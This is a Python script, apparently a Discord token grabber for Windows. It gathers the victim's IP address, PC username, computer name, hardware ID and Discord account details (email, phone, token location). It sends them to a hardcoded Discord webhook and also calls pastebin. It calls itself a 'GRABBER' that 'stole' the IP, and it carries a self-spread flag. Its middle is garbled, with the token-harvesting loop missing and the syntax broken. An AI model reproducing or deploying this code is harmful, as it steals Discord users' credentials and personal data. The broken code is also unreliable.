import os
if os.name != "nt":
    exit()
from re import findall
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from datetime import datetime
from threading import Thread
from time import sleep
from sys import argv
from discord_webhook import DiscordWebhook



def getdeveloper():
    dev = "wodx"
    try:
        dev = urlopen(Request("https://pastebin.com/raw/yYETqw45")).read().decode()
    except:
        pass
    return dev
def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip
def getavatar(uid, aid):
    url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
    try:
        urlopen(Request(url))
    except:
        url = url[:-4]
    return url
def gethwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]

def main():
    prevent_spam = True
    self_spread = True
    embeds = []
    working = []
    checked = []
    working_ids = []
    ip = getip()
    pc_username = os.getenv("UserName")
    pc_name = os.getenv("COMPUTERNAME")
    user_path_name = os.getenv("userprofile").split("\\")[2]
    developer = getdeveloper()
    
            working_ids.append(uid)
            working.append(token)
            username = user_data["username"] + "#" + str(user_data["discriminator"])
            user_id = user_data["id"]
            avatar_id = user_data["avatar"]
            avatar_url = getavatar(user_id, avatar_id)
            email = user_data.get("email")
            phone = user_data.get("phone")
            embed = {
                "color": 0x7289da,
                "fields": [
                    {
                        "name": "**PC Info**",
                        "value": f'IP: {ip}\nUsername: {pc_username}\nPC Name: {pc_name}\nToken Location: {platform}',
                        "inline": True
                    }
    
                "author": {
                    "name": f"{username} ({user_id})",
                    "icon_url": avatar_url
                },
                "footer": {
                    "text": f"IP robada por Nahuuuuuuuuuuuuuel#0420"
                }
            }
            embeds.append(embed)
    if len(working) == 0:
        working.append('123')
    webhook = {
        "content": "",
        "embeds": embeds,
        "username": "Nahuuuuuuuuuuuuuel#0420 GRABBER",
        "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
    }
    try:
        urlopen(Request("https://discord.com/api/webhooks/781926092578619392/_xORf9w3GPMUsaq7T27fXzWGN4kVcuo1RWj4AWPA8XRWYmhMIwsMI8O6casmGRmB3We9", data=dumps(webhook).encode()))
    except:
        pass

try:
    main()
except Exception as e:
    print(e)
    pass